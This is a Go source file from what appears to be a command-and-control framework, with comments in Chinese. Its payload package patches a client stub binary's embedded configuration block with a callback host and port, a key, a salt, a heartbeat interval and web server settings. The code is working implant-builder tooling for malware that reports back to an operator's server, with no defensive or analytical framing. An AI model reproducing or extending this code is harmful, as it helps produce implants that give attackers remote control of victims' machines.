package payload

import (
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"c2/internal/c2embed"
)

// 导出常量供模板/UI 文档与旧代码引用（实现位于 internal/c2embed）。
const (
	C2EmbedRelOffsetHost      = c2embed.RelOffsetHost
	C2EmbedRelOffsetPort      = c2embed.RelOffsetPort
	C2EmbedRelOffsetVKey      = c2embed.RelOffsetVKey
	C2EmbedRelOffsetSalt      = c2embed.RelOffsetSalt
	C2EmbedRelOffsetHeartbeat = c2embed.RelOffsetHeartbeat
	C2EmbedRelOffsetWebHost   = c2embed.RelOffsetWebHost
	C2EmbedRelOffsetWebPort   = c2embed.RelOffsetWebPort
	C2EmbedRelOffsetTail      = c2embed.RelOffsetTail
)

// ErrNoC2Embed 二进制中未找到合法嵌入块（须含 C2EMBED1…C2EMBED2 整段；请用当前 client/c2_embed_config.h 重编 stub）。
var ErrNoC2Embed = errors.New("no C2EMBED1..C2EMBED2 config block in binary")

// embedHostPortCombo 将 TCP/Web 写成 "host:port" 冗余进 C 字符串字段（须 len < max，与 net.JoinHostPort 一致，支持 IPv6）。
func embedHostPortCombo(host string, port, maxField int) string {
	host = strings.TrimSpace(host)
	if host == "" || port < 1 || port > 65535 {
		return host
	}
	j := net.JoinHostPort(host, strconv.Itoa(port))
	if len(j) >= maxField {
		return host
	}
	return j
}

// PatchC2Embed 复制 bin 并在首个 C2EMBED1 块处写入运行参数；成功时与 bin 等长。
func PatchC2Embed(bin []byte, cfg *Config, host string, port int) ([]byte, error) {
	if cfg == nil {
		return nil, fmt.Errorf("nil config")
	}
	off := c2embed.FindPatchOffset(bin)
	if off < 0 {
		return nil, ErrNoC2Embed
	}
	if off+c2embed.TotalSize > len(bin) {
		return nil, fmt.Errorf("C2 embed block extends past EOF")
	}
	wh, wp := cfg.WebHost, cfg.WebPort
	if strings.TrimSpace(wh) == "" {
		wh = "127.0.0.1"
	}
	if wp == 0 {
		wp = 8080
	}
	hi := cfg.HeartbeatInterval
	if hi == 0 {
		hi = 30
	}
	if port < 0 || port > 65535 {
		return nil, fmt.Errorf("invalid port %d", port)
	}

	tcpHostField := embedHostPortCombo(host, port, c2embed.HostLen)
	webHostField := embedHostPortCombo(wh, wp, c2embed.WebHostLen)

	out := make([]byte, len(bin))
	copy(out, bin)
	if err := c2embed.WriteAt(out, off, tcpHostField, port, cfg.VKey, cfg.Salt, hi, webHostField, wp); err != nil {
		return nil, err
	}
	return out, nil
}
